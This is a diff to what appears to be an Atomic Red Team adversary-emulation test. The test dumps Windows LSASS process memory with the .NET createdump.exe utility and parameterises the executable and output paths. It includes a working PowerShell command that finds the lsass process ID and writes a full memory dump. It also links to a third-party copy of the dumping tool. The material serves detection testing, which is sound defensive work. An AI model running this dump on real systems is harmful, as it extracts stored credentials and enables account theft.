@@ -240,20 +240,31 @@ atomic_tests:
     (https://twitter.com/bopin2020/status/1366400799199272960?s=20) from @bopin2020 in order to dump lsass
   supported_platforms:
   - windows
+  input_arguments:
+    output_file:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: C:\Windows\Temp\dotnet-lsass.dmp
+    createdump_exe:
+      description: Path of createdump.exe executable
+      type: Path
+      default: 'C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.3\createdump.exe'
   dependency_executor_name: powershell
+  dependencies:
   - description: |
-      Computer must createdump.exe from .Net 5
+      Computer must have createdump.exe from .Net 5
     prereq_command: |
-      if exist "C:\Program Files\dotnet\shared\Microsoft.NETCore.App\" {exit 0} else {exit 1}
+      if (Test-Path '#{createdump_exe}') {exit 0} else {exit 1}
     get_prereq_command: |
-      echo ".NET 5 must be installed manually"
+      echo ".NET 5 must be installed manually." "For the very brave a copy of the executable can be found here: https://github.com/Scoubi/RedTeam-Tools/blob/main/createdump.exe"
   executor:
     command: |
+      echo "Createdump Path #{createdump_exe}"
       $LSASS = tasklist | findstr "lsass"
       $FIELDS = $LSASS -split "\s+"
       $ID = $FIELDS[1]
-      & 'C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*\createdump.exe' -u -f lsass.dmp $ID
+      & "#{createdump_exe}" -u -f #{output_file} $ID
     cleanup_command: |
-      del 'C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*\lsass.dmp'
-    name: command_prompt
+      del #{output_file}
+    name: powershell
     elevation_required: true
